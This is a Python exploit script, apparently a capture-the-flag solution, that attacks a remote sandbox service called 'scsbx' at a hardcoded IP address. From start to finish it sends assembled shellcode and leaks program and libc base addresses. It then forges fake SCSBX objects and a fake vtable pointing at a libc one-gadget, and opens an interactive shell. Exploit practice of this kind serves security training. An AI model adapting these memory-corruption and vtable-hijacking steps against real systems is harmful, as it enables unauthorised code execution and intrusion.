from ptrlib import *
import os

os.system("python assemble.py exploit.S")
with open("output.bin", "rb") as f:
    code = f.read()

HOST = os.getenv("HOST", "153.120.170.218")
PORT = os.getenv("PORT", "19001")

#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("../files/scsbx")
libc = ELF("../files/libc-2.31.so")
sock = Socket(HOST, int(PORT))
ofs_vtable = 0x203c68

sock.sendlineafter(": ", str(len(code)))
sock.sendafter(": ", code)

# leak proc base
proc_base = (u64(sock.recv(8)) >> 16) - ofs_vtable
logger.info("proc = " + hex(proc_base))

# inject address into stack
sock.send(p64(proc_base + ofs_vtable))

# inject fake vector of pair
fake_vector  = p64(0xfffe0000) # address
fake_vector += p64(0xffffffff) # size
sock.send(fake_vector)

# inject fake SCSBX
fake_scsbx  = p64(0) * 2
fake_scsbx += p64(proc_base + ofs_vtable) # vtable
fake_scsbx += p64(0xfffff000) # std::vector<std::pair>
fake_scsbx += p64(0xfffff010)
fake_scsbx += p64(0xfffff100)
fake_scsbx += p64(code.find(p32(0xc0b3beef)) + 3) # pc, status
fake_scsbx += p64(0x55540000) # code
fake_scsbx += p64(proc_base) # stack
fake_scsbx += p32(0x1000) + p32(0xf000) # code_size, capacity
fake_scsbx += p32(0x810a0 - 1) # top
sock.send(fake_scsbx)

# leak libc base
libc_base = u64(sock.recv(8)) - libc.symbol("read")
logger.info("libc = " + hex(libc_base))

# inject fake SCSBX
fake_scsbx  = p64(0) * 2
fake_scsbx += p64(0x100000050) # vtable
fake_scsbx += p64(0xfffff000) # std::vector<std::pair>
fake_scsbx += p64(0xfffff010)
fake_scsbx += p64(0xfffff100)
fake_scsbx += p64(code.find(p32(0xfeedface)) + 3) # pc, status
fake_scsbx += p64(0x55540000) # code
fake_scsbx += p64(0xffff0000 - 4) # stack
fake_scsbx += p32(0x1000) + p32(0xf000) # code_size, capacity
fake_scsbx += p64(0) + p64(0) # top
# fake vtable
fake_scsbx += p64(0xffffffffdeadbee0)
fake_scsbx += p64(libc_base + 0xe6ce9) # __assert_range_valid
sock.send(fake_scsbx)

sock.interactive()
